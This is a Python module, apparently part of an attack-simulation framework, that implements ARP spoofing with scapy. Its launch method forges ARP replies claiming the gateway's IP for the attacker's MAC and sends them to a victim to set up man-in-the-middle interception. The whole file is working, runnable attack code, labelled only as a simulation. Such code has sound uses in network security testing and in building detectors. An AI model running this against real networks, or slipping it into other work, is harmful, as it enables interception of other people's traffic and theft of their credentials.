"""ARP Spoofing attack module.

Sends gratuitous ARP replies to trick the victim into associating
the gateway's IP with the attacker's MAC address, enabling
Man-in-the-Middle interception of traffic.

ARP has no authentication — any host can claim any IP→MAC binding,
and other hosts will trust it unconditionally.
"""

import time
from datetime import datetime

from scapy.all import ARP, Ether, getmacbyip, sendp

from attacks.base import BaseAttack
from common.models import AttackResult


class ARPSpoof(BaseAttack):
    """ARP spoofing (Man-in-the-Middle) attack simulation.

    Sends forged ARP replies that claim the gateway's IP belongs to the
    attacker's MAC. Victim devices that accept these replies will route
    their traffic through the attacker.
    """

    attack_type = "arp_spoof"

    def __init__(
        self,
        target_ip: str,
        gateway_ip: str,
        target_mac: str = None,
        interface: str = "eth0",
    ):
        """Initialize the ARP spoof attack.

        Args:
            target_ip: IP address of the victim to poison.
            gateway_ip: IP address of the gateway to impersonate.
            target_mac: MAC of the victim (auto-resolved if None).
            interface: Network interface to send packets on.
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.interface = interface

    def launch(self, count: int = 10, interval: float = 0.1) -> AttackResult:
        """Send spoofed ARP replies claiming to be the gateway.

        Args:
            count: Number of spoofed ARP replies to send.
            interval: Seconds between each packet.

        Returns:
            AttackResult with attack metadata.
        """
        # Resolve target MAC if not provided
        dst_mac = (
            self.target_mac
            or getmacbyip(self.target_ip)
            or "ff:ff:ff:ff:ff:ff"
        )

        # Craft ARP reply: "I am <gateway_ip>" (but hwsrc = attacker's MAC)
        packet = Ether(dst=dst_mac) / ARP(
            op=2,                       # ARP Reply
            psrc=self.gateway_ip,       # Claim to be the gateway
            pdst=self.target_ip,        # Directed at the victim
            hwdst=dst_mac,              # Victim's MAC
            # hwsrc intentionally omitted → defaults to attacker's real MAC
        )

        start_time = datetime.now()
        start = time.monotonic()

        sendp(
            packet,
            count=count,
            inter=interval,
            iface=self.interface,
            verbose=False,
        )

        duration = time.monotonic() - start

        return AttackResult(
            attack_type=self.attack_type,
            packets_sent=count,
            duration_s=duration,
            start_time=start_time,
        )
